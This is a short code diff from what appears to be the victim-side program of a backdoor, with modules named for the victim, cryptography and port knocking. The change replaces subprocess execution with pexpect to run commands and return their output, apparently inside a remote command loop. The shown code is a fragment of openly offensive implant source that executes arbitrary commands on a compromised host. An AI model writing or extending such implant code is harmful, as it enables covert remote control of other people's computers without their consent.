@@ -1,4 +1,5 @@
 import threading
+import pexpect
 from victim_utils import *
 from victim_cryptography import *
 from port_knocking import *
@@ -304,9 +305,11 @@ if __name__ == '__main__':
                             print(constants.MENU_CLOSING_BANNER)
                             break
 
-                        # Use subprocesses to execute command and return output as (string)
+                        # Use pexpect to execute commands and return output as (string)
                         try:
-                            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                            child = pexpect.spawn(command)
+                            child.expect(pexpect.EOF)
+                            result = child.before.decode()
                             print(result)
                         except Exception as e:
                             result = str(e)
